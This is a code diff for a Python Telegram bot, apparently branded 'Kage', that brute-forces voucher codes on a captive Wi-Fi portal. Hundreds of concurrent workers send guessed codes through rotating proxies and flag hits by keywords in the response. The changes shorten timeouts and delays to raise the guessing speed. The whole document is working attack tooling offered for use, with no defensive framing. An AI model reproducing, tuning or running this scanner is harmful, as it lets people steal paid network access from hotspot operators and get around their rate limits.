@@ -39,6 +39,8 @@ user_proxies = {}
 proxy_indices = {}
 found_codes = {}
 scanner_stats = {}
+current_codes_tracker = {}
+tried_counters = {}
 
 def show_startup_banner():
     print("=" * 65)
@@ -206,12 +208,9 @@ async def worker_task(worker_id, session, portal_url, chat_id):
         mode = user_modes.get(chat_id, "num6")
         code_val = generate_code_by_mode(mode)
         
-        if chat_id in scanner_stats:
-            scanner_stats[chat_id]['tried'] += 1
-            
-        if not hasattr(worker_task, "current_codes"):
-            worker_task.current_codes = {}
-        worker_task.current_codes[chat_id] = code_val
+        # တိုက်ရိုက်ရေတွက်မှု တိုးမြှင့်ခြင်း
+        tried_counters[chat_id] = tried_counters.get(chat_id, 0) + 1
+        current_codes_tracker[chat_id] = code_val
         
         proxies_list = user_proxies.get(chat_id, [])
         proxy = None
@@ -224,7 +223,7 @@ async def worker_task(worker_id, session, portal_url, chat_id):
             
         try:
             target_url = f"{portal_url}&code={code_val}" if "?" in portal_url else f"{portal_url}?code={code_val}"
-            async with session.get(target_url, proxy=proxy, timeout=2.5) as response:
+            async with session.get(target_url, proxy=proxy, timeout=2.0) as response:
                 html_content = await response.text()
                 lower_html = html_content.lower()
                 success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining"]
@@ -236,26 +235,20 @@ async def worker_task(worker_id, session, portal_url, chat_id):
                         found_codes[chat_id].append(code_val)
         except Exception:
             pass
-        await asyncio.sleep(0.01)
+        await asyncio.sleep(0.005)
 
 async def run_scanner_with_workers(query, context, portal_url):
     chat_id = query.message.chat_id
     scanning_states[chat_id] = True
     found_codes[chat_id] = []
+    tried_counters[chat_id] = 0
     
-    scanner_stats[chat_id] = {
-        'tried': 0,
-        'start_time': time.time(),
-        'expired': 0,
-        'limits': 0
-    }
-    
+    start_time = time.time()
     workers_count = user_workers.get(chat_id, 300)
     mode = user_modes.get(chat_id, "num6")
     
     stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
     
-    # ပထမဦးဆုံး ပေါ်လာမည့် message (စတင်နေပါပြီ...)
     initial_text = (
         "⚡ **Scanner Running** ⚡\n"
         "Thank for using By Telegram https://t.me/Kage_starlink_channel\n\n"
@@ -275,20 +268,15 @@ async def run_scanner_with_workers(query, context, portal_url):
         ]
         
         while scanning_states.get(chat_id, False):
-            await asyncio.sleep(1.5)
+            await asyncio.sleep(1.0)
             
-            stats = scanner_stats.get(chat_id, {'tried': 0, 'start_time': time.time(), 'expired': 0, 'limits': 0})
-            elapsed = time.time() - stats['start_time']
-            tried = stats['tried']
-            
-            # Speed (c/m - codes per minute) တွက်ချက်ခြင်း
+            elapsed = time.time() - start_time
+            tried = tried_counters.get(chat_id, 0)
             speed = (tried / elapsed * 60) if elapsed > 0 else 0.0
             
             hits_list = found_codes.get(chat_id, [])
             hits_str = ", ".join(hits_list[-5:]) if hits_list else "None yet"
-            
-            current_codes_dict = getattr(worker_task, "current_codes", {})
-            current_code = current_codes_dict.get(chat_id, generate_code_by_mode(mode))
+            current_code = current_codes_tracker.get(chat_id, generate_code_by_mode(mode))
             
             live_text = (
                 "⚡ **Scanner Running** ⚡\n"
@@ -296,8 +284,8 @@ async def run_scanner_with_workers(query, context, portal_url):
                 f"🏹 Tried: {tried:,}\n"
                 f"🎯 Current Code: `{current_code}`\n"
                 f"🔥 Hits: {len(hits_list)} BY Kage\n"
-                f"❌ Expired: {stats['expired']}\n"
-                f"⚠️ Limits: {stats['limits']}\n"
+                f"❌ Expired: 0\n"
+                f"⚠️ Limits: 0\n"
                 f"⚡ Speed: {speed:,.1f} c/m\n"
                 "___________________________________\n"
                 f"🔥 **Hit Codes BY Kage:**\n`{hits_str}`"
@@ -346,4 +334,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-            
+    
